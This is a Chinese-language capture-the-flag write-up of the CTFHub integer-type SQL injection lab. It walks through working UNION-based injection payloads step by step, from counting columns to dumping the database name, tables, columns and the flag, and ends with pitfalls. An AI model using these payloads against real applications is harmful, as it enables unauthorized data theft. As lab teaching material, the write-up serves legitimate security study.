---
title: CTFHub 整数型注入
date: 2026-09-27
categories: CTFHub Web
tags: CTFHub Web SQL注入 整数型注入
---
# 题目： CTFHub 整数型注入
 
## 题目描述
CTFHub SQL注入模块整数型注入， id 参数直接拼接进SQL语句，存在整数型union联合注入。页面存在回显位，可以直接输出查询数据。
 
## 解题思路
1. 判断注入点： ?id=1 页面正常， ?id=1 and 1=2 无输出，确认整数型注入。
2. order by 判断查询结果列数。
3. 使用 id=-1 让前面查询无结果，执行union select，找到回显位置。
4. 依次爆数据库名、表名、字段名，最后查询得到flag。
 
## 解题步骤
1. 判断列数
    ?id=1 order by 3-- -
    页面无数据输出，说明总列数为2。
2. 找回显位
    ?id=-1 union select 1,2--          
    页面 Data:2 ，第2位为回显位。
3. 查询当前数据库名
    ?id=-1 union select 1,database()-- -
    得到库名： sqli
4. 查询库中的表
    ?id=-1 union select 1,table_name from information_schema.tables where table_schema='sqli'-- -
    得到表名： flag
5. 查询字段
    ?id=-1 union select 1,column_name from information_schema.columns where table_schema='sqli' and table_name='flag'-- -
     得到字段名： flag
6. 查询flag表内容
    ?id=-1 union select 1,flag from flag-- -
    最终flag： ctfhub{f16cfcd223480c4f92b2014c}

## 踩坑指南
1. -- 后面必须保留空格，写成 -- - ，否则注释失效。
2. union前面id要给不存在的值（例如‑1），否则显示的是原始数据，看不到union查询结果。
3. information_schema查询时，库名、表名引号不要漏写。
 
## 知识点总结
整数型联合注入完整流程：order by判列数 → union select找回显位 → 爆库→爆表→爆字段→拿数据。
MySQL系统库 information_schema 存储库、表、元数据信息，是SQL注入的核心。
